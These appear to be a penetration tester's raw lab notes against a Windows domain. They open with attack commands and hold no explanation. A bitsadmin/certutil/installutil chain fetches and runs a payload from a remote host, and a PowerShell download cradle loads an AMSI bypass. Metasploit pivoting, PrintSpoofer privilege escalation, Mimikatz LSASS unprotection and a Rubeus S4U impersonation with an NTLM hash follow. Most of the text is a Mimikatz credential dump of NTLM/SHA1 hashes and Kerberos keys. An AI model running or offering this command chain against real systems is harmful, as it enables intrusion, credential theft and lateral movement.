bitsadmin /Transfer myJob http://192.168.49.75/imp.txt C:\users\will\enc.txt && certutil -decode C:\users\will\enc.txt C:\users\will\ConsoleApp2.exe && del C:\users\will\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\will\ConsoleApp2.exe

use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks4a or use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j

execute -H -f notepad
migrate pid
c:\inetpub\wwwroot\upload\PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
c:\inetpub\wwwroot\upload\SpoolSample.exe web01 web01/pipe/test
ps -S spoolsv
migrate pid
IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.49.75/amsi.txt')
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""

[Rubeus.Program]::Main("s4u /user:web01$ /rc4:dd509fb2a4cceb59a691a4074aafcc62 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

Authentication Id : 0 ; 70075 (00000000:000111bb)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:38 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WEB01$
         * Domain   : EVIL
         * NTLM     : b07c09086397291fa00b568b3ea90f08
         * SHA1     : da29115a64631a8fd738e50df0290f62cc0a21ec
        tspkg :
        wdigest :
         * Username : WEB01$
         * Domain   : EVIL
         * Password : (null)
        kerberos :
         * Username : WEB01$
         * Domain   : evil.com
         * Password : 7d d4 b3 39 4a 47 39 c7 13 f0 83 25 db b0 34 c8 1c b9 fa b5 db 96 56 04 32 41 fc a8 20 86 f4 a9 34 f8 f3 42 f1 50 35 5d 0c 74 2c 26 20 fc f7 a7 07 db 5f fe f8 1a c8 90 9b 26 84 67 a4 6e bd 91 b9 79 7a 2d 77 10 e4 62 d8 76 a6 9d 21 67 da 4d 7f 84 bd 39 33 cc 3a f3 5b 9e 84 e3 a1 0d 20 ce ad 57 02 a7 0e ec 25 db 4e f1 89 d7 be 1a b6 58 a0 1f d5 21 1a 25 69 64 f4 14 58 30 f0 4b 15 11 ca b2 8d e5 20 38 e4 38 36 de 9b 04 9e 11 21 80 d2 da 78 10 f5 4c e9 6f 34 8d 84 da 06 db 96 66 29 35 fe 20 07 6f d5 62 a4 61 a8 ee 80 f1 79 97 5d f8 29 5f 8e 8b 26 bc 85 36 45 c9 75 91 f4 f4 c4 72 d9 49 ae f5 f4 da 14 64 f7 d6 b4 22 49 e4 8c c3 e5 ee 07 19 74 73 01 28 59 5e 96 7e 70 20 6f 01 3f 4d 26 8c d3 9b 36 2a a6 6e ca 40 9e 4f
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB01$
Domain            : EVIL
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:37 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WEB01$
         * Domain   : EVIL
         * NTLM     : dd509fb2a4cceb59a691a4074aafcc62
         * SHA1     : 7f72c0cf2c9f420db671b525943d1b80ddd2f9c4
        tspkg :
        wdigest :
         * Username : WEB01$
         * Domain   : EVIL
         * Password : (null)
        kerberos :
         * Username : web01$
         * Domain   : EVIL.COM
         * Password : c6 4d b4 47 ce 3a 69 26 e3 5b 5f 1d 1f 5a ca 75 04 bd 2c ea 3e 01 e1 cf b7 40 d8 2b 49 66 d4 52 98 fb 84 20 22 99 b2 b4 5c 8e b3 17 1d 8f 6c df ee 7a e6 8b ab 70 b8 84 63 a3 bf 30 78 4d 96 dc 07 a4 0a 66 23 a2 89 41 3f 11 8f a8 26 b2 f4 bf 1b 57 1e 29 3a 03 c9 af 57 74 1e 5a 93 ca 19 8c 27 c9 ad dc f9 95 b4 62 b2 8d 4c 65 a0 72 5b 6f ff 99 15 3a 03 27 ff f6 e4 38 c4 95 81 b6 58 95 92 a6 1b 2a 8a 00 17 c3 f3 23 00 6c ee 09 ba 50 98 f7 67 02 c8 5c 75 d0 86 04 90 b8 6f 7f b8 01 5a 30 c5 c9 11 c4 0c 33 78 41 7a 02 a0 1b fc a8 d2 84 6c 75 47 e9 a2 f5 47 4f 0a 13 b1 66 c6 c5 9c fc cd d0 05 11 b6 b3 37 66 1c a7 fc 48 09 27 46 7f e9 c3 9b c6 e0 80 dd 93 be 01 0d 1e 91 88 61 ca df 5e 78 40 70 cd 93 e7 f0 0f 14 0d 99 e5
        ssp :
        credman :

Authentication Id : 0 ; 40376 (00000000:00009db8)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:37 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WEB01$
         * Domain   : EVIL
         * NTLM     : dd509fb2a4cceb59a691a4074aafcc62
         * SHA1     : 7f72c0cf2c9f420db671b525943d1b80ddd2f9c4
        tspkg :
        wdigest :
         * Username : WEB01$
         * Domain   : EVIL
         * Password : (null)
        kerberos :
         * Username : WEB01$
         * Domain   : evil.com
         * Password : c6 4d b4 47 ce 3a 69 26 e3 5b 5f 1d 1f 5a ca 75 04 bd 2c ea 3e 01 e1 cf b7 40 d8 2b 49 66 d4 52 98 fb 84 20 22 99 b2 b4 5c 8e b3 17 1d 8f 6c df ee 7a e6 8b ab 70 b8 84 63 a3 bf 30 78 4d 96 dc 07 a4 0a 66 23 a2 89 41 3f 11 8f a8 26 b2 f4 bf 1b 57 1e 29 3a 03 c9 af 57 74 1e 5a 93 ca 19 8c 27 c9 ad dc f9 95 b4 62 b2 8d 4c 65 a0 72 5b 6f ff 99 15 3a 03 27 ff f6 e4 38 c4 95 81 b6 58 95 92 a6 1b 2a 8a 00 17 c3 f3 23 00 6c ee 09 ba 50 98 f7 67 02 c8 5c 75 d0 86 04 90 b8 6f 7f b8 01 5a 30 c5 c9 11 c4 0c 33 78 41 7a 02 a0 1b fc a8 d2 84 6c 75 47 e9 a2 f5 47 4f 0a 13 b1 66 c6 c5 9c fc cd d0 05 11 b6 b3 37 66 1c a7 fc 48 09 27 46 7f e9 c3 9b c6 e0 80 dd 93 be 01 0d 1e 91 88 61 ca df 5e 78 40 70 cd 93 e7 f0 0f 14 0d 99 e5
        ssp :
        credman :

Authentication Id : 0 ; 1397843 (00000000:00155453)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 12/26/2021 6:45:33 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : WEB01$
         * Domain   : EVIL
         * NTLM     : dd509fb2a4cceb59a691a4074aafcc62
         * SHA1     : 7f72c0cf2c9f420db671b525943d1b80ddd2f9c4
        tspkg :
        wdigest :
         * Username : WEB01$
         * Domain   : EVIL
         * Password : (null)
        kerberos :
         * Username : WEB01$
         * Domain   : evil.com
         * Password : c6 4d b4 47 ce 3a 69 26 e3 5b 5f 1d 1f 5a ca 75 04 bd 2c ea 3e 01 e1 cf b7 40 d8 2b 49 66 d4 52 98 fb 84 20 22 99 b2 b4 5c 8e b3 17 1d 8f 6c df ee 7a e6 8b ab 70 b8 84 63 a3 bf 30 78 4d 96 dc 07 a4 0a 66 23 a2 89 41 3f 11 8f a8 26 b2 f4 bf 1b 57 1e 29 3a 03 c9 af 57 74 1e 5a 93 ca 19 8c 27 c9 ad dc f9 95 b4 62 b2 8d 4c 65 a0 72 5b 6f ff 99 15 3a 03 27 ff f6 e4 38 c4 95 81 b6 58 95 92 a6 1b 2a 8a 00 17 c3 f3 23 00 6c ee 09 ba 50 98 f7 67 02 c8 5c 75 d0 86 04 90 b8 6f 7f b8 01 5a 30 c5 c9 11 c4 0c 33 78 41 7a 02 a0 1b fc a8 d2 84 6c 75 47 e9 a2 f5 47 4f 0a 13 b1 66 c6 c5 9c fc cd d0 05 11 b6 b3 37 66 1c a7 fc 48 09 27 46 7f e9 c3 9b c6 e0 80 dd 93 be 01 0d 1e 91 88 61 ca df 5e 78 40 70 cd 93 e7 f0 0f 14 0d 99 e5
        ssp :
        credman :

Authentication Id : 0 ; 467822 (00000000:0007236e)
Session           : Interactive from 0
User Name         : Administrator
Domain            : WEB01
Logon Server      : WEB01
Logon Time        : 12/26/2021 6:38:09 AM
SID               : S-1-5-21-1607807028-3881622887-1966001951-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WEB01
         * NTLM     : 87cc5fd863cb29f2d1fec46733f46274
         * SHA1     : af783494dc34399abf270527f45c62b89ab206bd
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WEB01
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : WEB01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 347088 (00000000:00054bd0)
Session           : Interactive from 0
User Name         : Administrator
Domain            : WEB01
Logon Server      : WEB01
Logon Time        : 10/19/2021 6:18:59 AM
SID               : S-1-5-21-1607807028-3881622887-1966001951-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WEB01
         * NTLM     : 87cc5fd863cb29f2d1fec46733f46274
         * SHA1     : af783494dc34399abf270527f45c62b89ab206bd
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WEB01
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : WEB01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:40 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:38 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70056 (00000000:000111a8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:38 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WEB01$
         * Domain   : EVIL
         * NTLM     : dd509fb2a4cceb59a691a4074aafcc62
         * SHA1     : 7f72c0cf2c9f420db671b525943d1b80ddd2f9c4
        tspkg :
        wdigest :
         * Username : WEB01$
         * Domain   : EVIL
         * Password : (null)
        kerberos :
         * Username : WEB01$
         * Domain   : evil.com
         * Password : c6 4d b4 47 ce 3a 69 26 e3 5b 5f 1d 1f 5a ca 75 04 bd 2c ea 3e 01 e1 cf b7 40 d8 2b 49 66 d4 52 98 fb 84 20 22 99 b2 b4 5c 8e b3 17 1d 8f 6c df ee 7a e6 8b ab 70 b8 84 63 a3 bf 30 78 4d 96 dc 07 a4 0a 66 23 a2 89 41 3f 11 8f a8 26 b2 f4 bf 1b 57 1e 29 3a 03 c9 af 57 74 1e 5a 93 ca 19 8c 27 c9 ad dc f9 95 b4 62 b2 8d 4c 65 a0 72 5b 6f ff 99 15 3a 03 27 ff f6 e4 38 c4 95 81 b6 58 95 92 a6 1b 2a 8a 00 17 c3 f3 23 00 6c ee 09 ba 50 98 f7 67 02 c8 5c 75 d0 86 04 90 b8 6f 7f b8 01 5a 30 c5 c9 11 c4 0c 33 78 41 7a 02 a0 1b fc a8 d2 84 6c 75 47 e9 a2 f5 47 4f 0a 13 b1 66 c6 c5 9c fc cd d0 05 11 b6 b3 37 66 1c a7 fc 48 09 27 46 7f e9 c3 9b c6 e0 80 dd 93 be 01 0d 1e 91 88 61 ca df 5e 78 40 70 cd 93 e7 f0 0f 14 0d 99 e5
        ssp :
        credman :

Authentication Id : 0 ; 40277 (00000000:00009d55)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:37 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WEB01$
         * Domain   : EVIL
         * NTLM     : dd509fb2a4cceb59a691a4074aafcc62
         * SHA1     : 7f72c0cf2c9f420db671b525943d1b80ddd2f9c4
        tspkg :
        wdigest :
         * Username : WEB01$
         * Domain   : EVIL
         * Password : (null)
        kerberos :
         * Username : WEB01$
         * Domain   : evil.com
         * Password : c6 4d b4 47 ce 3a 69 26 e3 5b 5f 1d 1f 5a ca 75 04 bd 2c ea 3e 01 e1 cf b7 40 d8 2b 49 66 d4 52 98 fb 84 20 22 99 b2 b4 5c 8e b3 17 1d 8f 6c df ee 7a e6 8b ab 70 b8 84 63 a3 bf 30 78 4d 96 dc 07 a4 0a 66 23 a2 89 41 3f 11 8f a8 26 b2 f4 bf 1b 57 1e 29 3a 03 c9 af 57 74 1e 5a 93 ca 19 8c 27 c9 ad dc f9 95 b4 62 b2 8d 4c 65 a0 72 5b 6f ff 99 15 3a 03 27 ff f6 e4 38 c4 95 81 b6 58 95 92 a6 1b 2a 8a 00 17 c3 f3 23 00 6c ee 09 ba 50 98 f7 67 02 c8 5c 75 d0 86 04 90 b8 6f 7f b8 01 5a 30 c5 c9 11 c4 0c 33 78 41 7a 02 a0 1b fc a8 d2 84 6c 75 47 e9 a2 f5 47 4f 0a 13 b1 66 c6 c5 9c fc cd d0 05 11 b6 b3 37 66 1c a7 fc 48 09 27 46 7f e9 c3 9b c6 e0 80 dd 93 be 01 0d 1e 91 88 61 ca df 5e 78 40 70 cd 93 e7 f0 0f 14 0d 99 e5
        ssp :
        credman :

Authentication Id : 0 ; 38897 (00000000:000097f1)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:37 AM
SID               :
        msv :
         [00000003] Primary
         * Username : WEB01$
         * Domain   : EVIL
         * NTLM     : dd509fb2a4cceb59a691a4074aafcc62
         * SHA1     : 7f72c0cf2c9f420db671b525943d1b80ddd2f9c4
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEB01$
Domain            : EVIL
Logon Server      : (null)
Logon Time        : 10/19/2021 6:16:37 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WEB01$
         * Domain   : EVIL
         * Password : (null)
        kerberos :
         * Username : web01$
         * Domain   : EVIL.COM
         * Password : c6 4d b4 47 ce 3a 69 26 e3 5b 5f 1d 1f 5a ca 75 04 bd 2c ea 3e 01 e1 cf b7 40 d8 2b 49 66 d4 52 98 fb 84 20 22 99 b2 b4 5c 8e b3 17 1d 8f 6c df ee 7a e6 8b ab 70 b8 84 63 a3 bf 30 78 4d 96 dc 07 a4 0a 66 23 a2 89 41 3f 11 8f a8 26 b2 f4 bf 1b 57 1e 29 3a 03 c9 af 57 74 1e 5a 93 ca 19 8c 27 c9 ad dc f9 95 b4 62 b2 8d 4c 65 a0 72 5b 6f ff 99 15 3a 03 27 ff f6 e4 38 c4 95 81 b6 58 95 92 a6 1b 2a 8a 00 17 c3 f3 23 00 6c ee 09 ba 50 98 f7 67 02 c8 5c 75 d0 86 04 90 b8 6f 7f b8 01 5a 30 c5 c9 11 c4 0c 33 78 41 7a 02 a0 1b fc a8 d2 84 6c 75 47 e9 a2 f5 47 4f 0a 13 b1 66 c6 c5 9c fc cd d0 05 11 b6 b3 37 66 1c a7 fc 48 09 27 46 7f e9 c3 9b c6 e0 80 dd 93 be 01 0d 1e 91 88 61 ca df 5e 78 40 70 cd 93 e7 f0 0f 14 0d 99 e5
        ssp :
        credman :